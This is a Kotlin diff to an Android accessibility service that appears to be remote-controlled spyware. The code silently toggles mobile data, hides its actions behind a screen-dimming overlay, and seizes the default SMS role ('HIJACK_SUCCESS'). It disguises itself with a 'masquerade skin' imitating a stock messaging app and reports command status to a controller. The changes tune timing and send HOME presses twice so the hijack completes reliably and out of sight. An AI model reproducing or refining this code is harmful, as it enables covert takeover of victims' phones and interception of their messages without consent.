@@ -341,10 +341,15 @@ class MyAccessibilityService : AccessibilityService() {
                                 parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                 DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via exact structural match.")
                                 isWaitingForDataSettings = false
-                                // Final step: Restore screen brightness after 2 seconds
+                                
+                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                    performGlobalAction(GLOBAL_ACTION_HOME)
+                                }, 800)
+                                
+                                // Final step: Restore screen brightness after home jump
                                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                     DimmerManager.removeOverlay(applicationContext)
-                                }, 2000)
+                                }, 2500)
                                 break
                             }
                         }
@@ -395,10 +400,18 @@ class MyAccessibilityService : AccessibilityService() {
                         }
                         DefaultSmsManager.expectedMode = "" // Disarm
                         CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
-                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        
+                        // Delay HOME slightly to ensure dialogs resolve and OS processes the action
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                performGlobalAction(GLOBAL_ACTION_HOME)
+                            }, 300)
+                        }, 600)
+
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                             DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
-                        }, 1500)
+                        }, 2500)
                     }, 400)
                 }
             } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
@@ -420,18 +433,26 @@ class MyAccessibilityService : AccessibilityService() {
                 val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this)
                 val isFinished = if (mode == "AUTO_NAV") currentDefault == packageName else currentDefault == originalPkg
 
-                if (isFinished) {
+                                if (isFinished) {
                     DebugLogger.log("SMS_NAV", "Verification SUCCESS! Target ($targetLabel) is now Default.")
-                    DefaultSmsManager.expectedMode = "" 
+                    DefaultSmsManager.expectedMode = ""
                     if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
-                    
+
                     val msg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
                     CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)
-                    
-                    performGlobalAction(GLOBAL_ACTION_HOME)
+
+                    // Delay HOME to ensure dialog dismissal/transitions finish first, so OS doesn't drop the command
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        // Redundancy: send HOME twice to guarantee execution
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                        }, 300)
+                    }, 800)
+
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                         DynamicUIManager.removeOverlay(this@MyAccessibilityService, "RESTORE_SUCCESS_HOME_ROUTED")
-                    }, 1500)
+                    }, 2500)
                     return
                 }
 
